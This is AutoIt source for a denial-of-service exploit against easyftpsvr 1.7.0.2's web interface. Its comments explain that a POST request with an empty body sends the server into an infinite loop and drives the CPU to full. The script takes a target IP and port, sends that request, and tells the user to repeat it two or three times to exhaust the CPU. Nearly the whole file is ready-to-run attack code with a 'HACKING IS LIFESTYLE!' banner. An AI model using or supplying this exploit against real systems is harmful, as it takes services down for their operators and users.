#Region ;**** Directives created by AutoIt3Wrapper_GUI ****
#AutoIt3Wrapper_Outfile=smdcpu.exe
#AutoIt3Wrapper_UseUpx=n
#AutoIt3Wrapper_Change2CUI=y
#EndRegion ;**** Directives created by AutoIt3Wrapper_GUI ****
#include "WinHttp.au3"
#include <String.au3>

#cs

easyftpsvr-1.7.0.2 CPU consumption exploit.
The vulnerability is due easyftpsvr-1.7.0.2 's web interface (Easy-Web 
Server/1.0) contains flaw when accepting $_POST requests with EMPTY 
body.
In this case application runs into infinitve loop and consumes very high 
CPU usage.
Running following exploit 2-3 times against target machine that runs  
easyftpsvr-1.7.0.2  (against it native web interface called Easy-Web 
Server/1.0)
consumes high CPU usage.

----------------  Be Carefull! -----------------

*DO not run it against your real machine.(Instead of use Virtualbox)*
Otherwise hard reboot is your best friend.

Demo vid:  http://youtu.be/fq1ebZGkoJM

------------------------------------------------
/AkaStep

#ce

Opt("MustDeclareVars", 1)





Global $INVALIDIP='INVALID IP FORMAT';
Global $INVALIDPORT='INVALID PORT NUMBER!';




Global $f=_StringRepeat('#',10);

Global $msg_usage=$f & '  easyftpsvr-1.7.0.2 CPU consumption exploit ' & 
StringMid($f,1,7) & @CRLF & _
$f & " Usage:  " & _
@ScriptName &  ' REMOTEIP ' &  ' REMOTEPORT  ' & $f & @CRLF & _
StringReplace($f,'#','\') & _StringRepeat(' ',10)  & _
'HACKING IS LIFESTYLE!' & _StringRepeat(' ',10) &  
StringReplace($f,'#','/')



if $CmdLine[0]=0 Then
MsgBox(64,"easyftpsvr-1.7.0.2 CPU consumption exploit","This is a 
console Application!" & @CRLF & 'More Info: '  & @ScriptName & ' --help' 
& @CRLF & _
'Invoke It from MSDOS!',5)
exit;
EndIf
if  $CmdLine[0] <> 2 Then
  ConsoleWrite(@CRLF & _StringRepeat('#',62) & @CRLF & $msg_usage & 
@CRLF & _StringRepeat('#',62) & @CRLF);
  exit;
EndIf

ConsoleWrite(@CRLF & _StringRepeat('#',62) & @CRLF & $msg_usage & @CRLF 
& _StringRepeat('#',62) & @CRLF);

Global $ipaddr=StringMid($CmdLine[1],1,15);//255.255.255.255
Global $port=StringMid($CmdLine[2],1,5);//65535






Global $useragent='Mozilla/5.0 (Windows NT 5.1; rv:20.0) Gecko/20100101 
Firefox/20.0';
Global $reqmethod='POST';
global $root_dir='/';
Global $thisconsumes='';//<=This is a reason of High CPU consumption. 
Empty $_POST body causes application to run into infinitve loop//




Global $hOpen = _WinHttpOpen($useragent);
Global $hConnect = _WinHttpConnect($hOpen, $ipaddr,$port)
Global $hRequest = 
_WinHttpOpenRequest($hConnect,$reqmethod,$root_dir,Default,Default,'');
_WinHttpAddRequestHeaders($hRequest, "Accept: 
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" & 
@CRLF)
_WinHttpAddRequestHeaders($hRequest, "Accept-Language: en-US,en;q=0.5"& 
@CRLF)
_WinHttpAddRequestHeaders($hRequest, "Accept-Encoding: gzip, deflate"& 
@CRLF)
_WinHttpAddRequestHeaders($hRequest, "DNT: 1"& @CRLF)
_WinHttpAddRequestHeaders($hRequest, "Connection: close"& @CRLF)

_WinHttpSendRequest($hRequest, -1, $thisconsumes);// send empty $_POST 
body.//

Global $sHeader, $sReturned


If _WinHttpQueryDataAvailable($hRequest) Then

$sHeader = _WinHttpQueryHeaders($hRequest)
$sReturned &= _WinHttpReadData($hRequest)
_WinHttpCloseHandle($hRequest)
_WinHttpCloseHandle($hConnect)
_WinHttpCloseHandle($hOpen)
EndIf

ConsoleWrite(_StringRepeat('#',62) & @CRLF & _StringRepeat(' ',10)  &' 
PACKET WAS SENT! ' &  _StringRepeat(' ',10) & @CRLF & 
_StringRepeat('#',62));
ConsoleWrite(@CRLF & $f &  ' Run this exploit 2-3 times against target 
it will consume CPU deadly. ' & $f & @CRLF);
Exit;

